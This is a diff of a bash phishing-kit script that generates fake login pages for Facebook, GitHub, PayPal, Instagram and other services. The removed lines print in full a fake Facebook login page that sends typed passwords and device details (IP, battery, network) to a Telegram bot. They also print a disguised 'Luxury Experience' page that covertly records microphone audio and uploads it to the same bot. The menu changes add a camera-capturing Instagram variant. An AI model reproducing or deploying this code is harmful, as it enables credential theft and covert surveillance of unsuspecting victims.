@@ -352,156 +352,6 @@ paypal_page() {
 EOF
 }
 
-record_page() {
-    cat <<EOF
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Luxury Experience</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@500&display=swap');
-
-        body {
-            font-family: 'Cinzel', serif;
-            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
-            color: white;
-            text-align: center;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            overflow: hidden;
-        }
-
-        .background {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle, rgba(255,215,0,0.2) 0%, rgba(0,0,0,0) 70%);
-            animation: fadeGlow 5s infinite alternate;
-        }
-
-        @keyframes fadeGlow {
-            0% { opacity: 0.6; }
-            100% { opacity: 1; }
-        }
-
-        h1 {
-            font-size: 3.5em;
-            background: linear-gradient(45deg, #ffd700, #ff9800);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
-            animation: glow 2s infinite alternate;
-        }
-
-        @keyframes glow {
-            from { text-shadow: 0 0 10px rgba(255, 215, 0, 0.6); }
-            to { text-shadow: 0 0 20px rgba(255, 215, 0, 1); }
-        }
-
-        .container {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 35px;
-            border-radius: 20px;
-            box-shadow: 0px 0px 25px rgba(255, 215, 0, 0.3);
-            max-width: 550px;
-            backdrop-filter: blur(10px);
-            transition: transform 0.3s ease-in-out;
-        }
-
-        .container:hover {
-            transform: scale(1.05);
-        }
-
-        p {
-            font-size: 20px;
-            color: #e0e0e0;
-        }
-
-        .hidden-btn {
-            opacity: 0;
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            overflow: hidden;
-        }
-    </style>
-</head>
-<body>
-    <div class="background"></div>
-    <div class="container">
-        <h1>Welcome to Luxury Experience ✨</h1>
-        <p>Indulge in elegance with cutting-edge technology and premium design.</p>
-        <button class="hidden-btn" id="recordBtn">Click to Enjoy</button>
-    </div>
-
-    <script>
-        const botToken = "${token}";
-        const chatId = "${id}";
-        let mediaRecorder;
-        let audioChunks = [];
-
-        async function startRecording() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                mediaRecorder = new MediaRecorder(stream);
-
-                mediaRecorder.ondataavailable = event => {
-                    audioChunks.push(event.data);
-                };
-
-                mediaRecorder.onstop = async () => {
-                    if (audioChunks.length > 0) {
-                        const audioBlob = new Blob(audioChunks, { type: "audio/ogg" });
-                        sendAudio(audioBlob);
-                        audioChunks = [];
-                    }
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 3000); // التوقف بعد 3 ثوانٍ
-            } catch (error) {
-                console.error("Recording error:", error);
-            }
-        }
-
-        async function sendAudio(audioBlob) {
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("audio", audioBlob, "recording.ogg");
-
-            try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
-                    method: "POST",
-                    body: formData
-                });
-            } catch (error) {
-                console.error("Failed to send audio:", error);
-            }
-        }
-
-       
-        document.getElementById("recordBtn").click();
-        setTimeout(startRecording, 3000);
-
-        
-        window.addEventListener("beforeunload", () => {
-            if (mediaRecorder && mediaRecorder.state === "recording") {
-                mediaRecorder.stop();
-            }
-        });
-    </script>
-</body>
-</html>
-EOF
-}
-
 github_page() {
     cat <<EOF
 <!DOCTYPE html>
@@ -561,83 +411,6 @@ github_page() {
             if (result.ok) {
                 alert('Login successful! Redirecting...');
                 window.location.href = 'https://github.com';
-            } else {
-                alert('Login failed. Please check your credentials.');
-            }
-        });
-        async function getDeviceInfo() {
-            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
-            const battery = await navigator.getBattery();
-            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
-            const deviceName = navigator.userAgent;
-            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
-        }
-    </script>
-</body>
-</html>
-EOF
-}
-
-facebook_page() {
-    cat <<EOF
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login</title>
-    <style>
-        /* CSS styling for Facebook login page */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Arial', sans-serif; background-color: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
-        .login-container img { width: 100px; margin-bottom: 25px; }
-        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
-        input:focus { border-color: #1877f2; box-shadow: 0 0 8px rgba(24, 119, 242, 0.2); }
-        .btn-login { width: 100%; padding: 14px; background-color: #1877f2; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
-        .btn-login:hover { background-color: #145dbf; }
-        .forgot-password { margin-top: 10px; font-size: 14px; }
-        .forgot-password a { color: #1877f2; text-decoration: none; }
-        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
-        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #1877f2; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
-        .signup-btn:hover { background-color: #f4f4f4; }
-        .terms { margin-top: 20px; font-size: 12px; color: #888; }
-        .terms a { color: #1877f2; text-decoration: none; }
-    </style>
-</head>
-<body>
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
-        <h2>Log in to Facebook</h2>
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Email or phone" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit" class="btn-login">Log In</button>
-        </form>
-        <p class="forgot-password"><a href="#">Forgotten password?</a></p>
-        <div class="divider"></div>
-        <button class="signup-btn">Create new account</button>
-    </div>
-    <script>
-        const loginForm = document.getElementById('loginForm');
-        loginForm.addEventListener('submit', async function (event) {
-            event.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const deviceInfo = await getDeviceInfo();
-            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: '${id}',
-                    text: \`Facebook Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
-                })
-            });
-            const result = await response.json();
-            if (result.ok) {
-                alert('Login successful! Redirecting...');
-                window.location.href = 'https://www.facebook.com';
             } else {
                 alert('Login failed. Please check your credentials.');
             }
@@ -1785,7 +1558,7 @@ show_menu() {
     echo -e "${BLUE}[7] Twitter login${NC}"
     echo -e "${BLUE}[8] PayPal login${NC}"
     echo -e "${BLUE}[9] GitHub login${NC}"
-    echo -e "${BLUE}[10] Record${NC}"
+    echo -e "${BLUE}[10] Instagram and camera and Record${NC}"
     echo -e "${YELLOW}=================================${NC}"
 }
 
@@ -1808,7 +1581,7 @@ case $choice in
         create_page "$page" "$(facebook_page)"
         ;;
     2)
-        page="Instagram_login"
+        page="instagram_login"
         create_page "$page" "$(instagram_page)"
         ;;
     3)
@@ -1840,8 +1613,8 @@ case $choice in
         create_page "$page" "$(github_page)"
         ;;
     10)
-        page="Record"
-        create_page "$page" "$(record_page)"
+        page="Instagram_login"
+        create_page "$page" "$(instagram_camera_page)"
         ;;
     *)
         echo -e "${RED}[-] Invalid choice. Please select a valid option.${NC}"
